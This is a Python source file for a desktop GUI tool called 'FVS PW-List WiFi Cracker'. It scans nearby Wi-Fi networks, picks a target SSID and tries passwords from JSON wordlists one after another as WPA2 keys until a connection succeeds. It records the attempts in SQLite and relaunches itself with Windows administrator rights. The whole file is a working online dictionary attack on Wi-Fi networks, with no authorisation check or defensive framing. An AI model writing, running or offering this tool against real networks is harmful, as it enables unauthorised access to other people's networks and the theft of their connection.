#!/usr/bin/env python3
import sys
import time
import glob
import ctypes
import sqlite3
import json
from pywifi import const, PyWiFi, Profile
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QObject
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QTextEdit, QPushButton,
    QVBoxLayout, QHBoxLayout, QFileDialog, QLineEdit, QCheckBox,
    QComboBox
)
from PyQt5.QtGui import QFont

# ─── Constants & Globals ───────────────────────────────────────────────────
DB_PATH = 'wifi_cracker.db'
should_continue = True


# ─── Database Helpers ─────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
    CREATE TABLE IF NOT EXISTS tried_passwords (
        ssid TEXT NOT NULL,
        password TEXT NOT NULL,
        PRIMARY KEY (ssid, password)
    )
    ''')
    c.execute('''
    CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
    )
    ''')
    conn.commit()
    conn.close()


def insert_tried_password(ssid, password):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO tried_passwords (ssid, password) VALUES (?, ?)', (ssid, password))
    conn.commit()
    conn.close()


def set_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, value))
    conn.commit()
    conn.close()


def get_setting(key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT value FROM settings WHERE key = ?', (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else ''


# ─── Elevate on Windows ─────────────────────────────────────────────────────
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit(0)

init_db()

# ─── Worker Thread ──────────────────────────────────────────────────────────
class CrackerWorker(QObject):
    success = pyqtSignal(str, int)
    failure = pyqtSignal(str, int)
    finished = pyqtSignal()

    def __init__(self, ssid, use_common, file_glob):
        super().__init__()
        self.ssid = ssid
        self.use_common = use_common
        self.file_glob = file_glob

    def run(self):
        global should_continue
        pwds = []
        for fn in glob.glob(self.file_glob):
            try:
                arr = json.load(open(fn))
                if isinstance(arr, list):
                    pwds += arr
            except:
                pass

        if self.use_common:
            try:
                common = json.load(open('lists/common_pass.json'))
                if isinstance(common, list):
                    pwds = common + pwds
            except:
                pass

        wifi = PyWiFi()
        iface = wifi.interfaces()[0]
        attempts = 0

        for entry in pwds:
            if not should_continue:
                break
            pwd = entry['password'] if isinstance(entry, dict) else entry
            attempts += 1

            iface.disconnect()
            for p in iface.network_profiles():
                if p.ssid == self.ssid:
                    iface.remove_network_profile(p)

            prof = Profile()
            prof.ssid = self.ssid
            prof.auth = const.AUTH_ALG_OPEN
            prof.akm = [const.AKM_TYPE_WPA2PSK]
            prof.cipher = const.CIPHER_TYPE_CCMP
            prof.key = pwd
            newp = iface.add_network_profile(prof)

            iface.connect(newp)
            time.sleep(1.5)

            if iface.status() == const.IFACE_CONNECTED:
                insert_tried_password(self.ssid, pwd)
                self.success.emit(pwd, attempts)
                break
            else:
                self.failure.emit(pwd, attempts)

        self.finished.emit()


# ─── Main Window ───────────────────────────────────────────────────────────
class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("FVS PW‑List WiFi Cracker")
        self.setStyleSheet("background:black; color:green;")
        self.resize(600, 640)
        self._build_ui()

    def _build_ui(self):
        global ssid_combo, spec_pw, common_chk, file_btn, output

        self.attempts_lbl = QLabel("Attempts: 0", self)
        self.attempts_lbl.setStyleSheet("color:#00ff99;")
        self.success_lbl = QLabel("", self)
        self.success_lbl.setFont(QFont("Consolas", 14))
        self.success_lbl.setStyleSheet("color:#ff3366;")

        output = QTextEdit(self)
        output.setReadOnly(True)
        output.setFont(QFont("Consolas", 10))
        output.setStyleSheet("background:#111; color:#00ff99;")

        reminder = QLabel(
            "⚠️ Please turn ON Location Services:\n"
            "   Settings → Privacy & security → Location", self)
        reminder.setStyleSheet("color:orange;")
        reminder.setFont(QFont("Consolas", 10))
        reminder.setAlignment(Qt.AlignCenter)

        ssid_combo = QComboBox(self)
        ssid_combo.setEditable(True)
        ssid_combo.setStyleSheet("background:#222; color:green; min-width:200px;")
        refresh_btn = QPushButton("Refresh SSIDs", self)
        refresh_btn.setStyleSheet("background:#222; color:green;")
        refresh_btn.clicked.connect(self.refresh_ssids)

        spec_pw = QLineEdit(self)
        spec_pw.setText(get_setting('specific_password'))
        spec_pw.setStyleSheet("background:#222; color:green; min-width:200px;")

        common_chk = QCheckBox("Use common first", self)
        common_chk.setChecked(True)
        common_chk.setStyleSheet("color:green;")
        file_btn = QPushButton("Select JSON…", self)
        file_btn.setStyleSheet("background:#222; color:green;")
        file_btn.clicked.connect(self.select_file)
        self.file_glob = 'lists/*.json'

        start_btn = QPushButton("Start Crack", self)
        start_btn.setStyleSheet("background:#00ff99; color:#111;")
        start_btn.clicked.connect(self.start_crack)
        stop_btn = QPushButton("Stop", self)
        stop_btn.setStyleSheet("background:#ff3366;")
        stop_btn.clicked.connect(self.stop_crack)
        test_btn = QPushButton("Test Spec", self)
        test_btn.setStyleSheet("background:#333; color:green;")
        test_btn.clicked.connect(self.test_specific)

        top = QHBoxLayout()
        top.addWidget(self.attempts_lbl)
        top.addStretch()
        top.addWidget(self.success_lbl)

        form = QVBoxLayout()
        form.addWidget(reminder)
        row = QHBoxLayout()
        row.addWidget(ssid_combo)
        row.addWidget(refresh_btn)
        form.addLayout(row)

        pw_row = QHBoxLayout()
        pw_row.addWidget(QLabel("Spec PW:", self))
        pw_row.addWidget(spec_pw)
        form.addLayout(pw_row)

        opts = QHBoxLayout()
        opts.addWidget(common_chk)
        opts.addWidget(file_btn)
        form.addLayout(opts)

        ctrls = QHBoxLayout()
        ctrls.addWidget(start_btn)
        ctrls.addWidget(stop_btn)
        ctrls.addWidget(test_btn)

        lay = QVBoxLayout(self)
        lay.addLayout(top)
        lay.addLayout(form)
        lay.addLayout(ctrls)
        lay.addWidget(output)

        self.output = output
        self.worker = None
        self.thread = None
        self.refresh_ssids()

    def refresh_ssids(self):
        ssid_combo.clear()
        wifi = PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(1.5)
        for net in iface.scan_results():
            if net.ssid and net.ssid not in [ssid_combo.itemText(i) for i in range(ssid_combo.count())]:
                ssid_combo.addItem(net.ssid)
        self.output.append("SSIDs refreshed.")

    def select_file(self):
        fn, _ = QFileDialog.getOpenFileName(self, "Choose JSON list", "", "JSON files (*.json)")
        if fn:
            self.file_glob = fn
            self.output.append(f"Using list: {fn}")

    def test_specific(self):
        ssid = ssid_combo.currentText().strip()
        pw = spec_pw.text().strip()
        if not ssid or not pw:
            return
        ok = self._attempt_once(ssid, pw)
        self.output.append(f"[TEST] {'✔' if ok else '✖'} {pw}")

    def _attempt_once(self, ssid, pw):
        wifi = PyWiFi()
        iface = wifi.interfaces()[0]
        iface.disconnect()
        prof = Profile()
        prof.ssid = ssid
        prof.auth = const.AUTH_ALG_OPEN
        prof.akm = [const.AKM_TYPE_WPA2PSK]
        prof.cipher = const.CIPHER_TYPE_CCMP
        prof.key = pw
        for p in iface.network_profiles():
            if p.ssid == ssid:
                iface.remove_network_profile(p)
        newp = iface.add_network_profile(prof)
        iface.connect(newp)
        time.sleep(1.5)
        return iface.status() == const.IFACE_CONNECTED

    def start_crack(self):
        global should_continue
        ssid = ssid_combo.currentText().strip()
        if not ssid:
            return
        should_continue = True

        set_setting('ssid', ssid)
        set_setting('specific_password', spec_pw.text().strip())

        self.thread = QThread()
        self.worker = CrackerWorker(ssid, common_chk.isChecked(), self.file_glob)
        self.worker.moveToThread(self.thread)
        self.worker.success.connect(self.on_success)
        self.worker.failure.connect(self.on_failure)
        self.worker.finished.connect(self.on_done)
        self.thread.started.connect(self.worker.run)
        self.thread.start()
        self.output.append("Starting crack…")

    def stop_crack(self):
        global should_continue
        should_continue = False
        self.output.append("Stopping…")

    def on_success(self, pwd, attempts):
        self.attempts_lbl.setText(f"Attempts: {attempts}")
        self.output.append(f"✔ Success at {attempts}: {pwd}")
        self.success_lbl.setText("LOGGED IN!")
        QTimer.singleShot(5000, lambda: self.success_lbl.setText(""))
        global should_continue
        should_continue = False

    def on_failure(self, pwd, attempts):
        self.attempts_lbl.setText(f"Attempts: {attempts}")
        self.output.append(f"✖ {pwd}")

    def on_done(self):
        self.output.append("Done.")
        self.thread.quit()
        self.thread.wait()


# ─── Run ────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app = QApplication(sys.argv)
    w = MainWindow()
    w.show()
    sys.exit(app.exec_())
